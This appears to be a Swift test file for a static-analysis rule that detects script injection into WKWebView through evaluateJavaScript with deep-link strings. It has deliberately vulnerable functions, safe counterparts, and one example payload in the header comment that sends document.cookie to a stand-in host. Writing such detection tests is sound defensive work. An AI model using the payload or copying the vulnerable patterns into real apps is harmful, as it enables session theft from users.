// CWE-95: the page is handed a script the app built out of somebody's string.
//
// `evaluateJavaScript` runs its argument in the web view's context, with
// whatever the loaded page can reach - its cookies, its storage, its DOM. A
// value pasted into the middle of a quoted JavaScript string closes the quote
// and keeps going, so a deep link carrying `');fetch('https://x/'+document.cookie);('`
// exfiltrates the session.
//
// The fix is not escaping. `callAsyncJavaScript(_:arguments:)` passes values
// as a dictionary that never becomes source text, which is the same shape as
// binding a SQL parameter and it works for the same reason.
import Foundation
import WebKit

final class Bridge {

    let view = WKWebView()

    func showFromDeepLink(_ url: URL) {
        let name = url.lastPathComponent
        // ruleid: swift-webview-evaluates-untrusted-script
        view.evaluateJavaScript("document.title = '\(name)'")
    }

    func searchFromQuery(_ url: URL) {
        let components = URLComponents(url: url, resolvingAgainstBaseURL: false)
        let term = components?.queryItems?.first?.value ?? ""
        // ruleid: swift-webview-evaluates-untrusted-script
        view.evaluateJavaScript("search('" + term + "')")
    }

    func showFixed() {
        // ok: swift-webview-evaluates-untrusted-script
        view.evaluateJavaScript("document.title = 'Home'")
    }

    func showAsArgument(_ url: URL) {
        let name = url.lastPathComponent
        // ok: swift-webview-evaluates-untrusted-script
        view.callAsyncJavaScript("document.title = name",
                                 arguments: ["name": name],
                                 in: nil,
                                 in: .page) { _ in }
    }
}
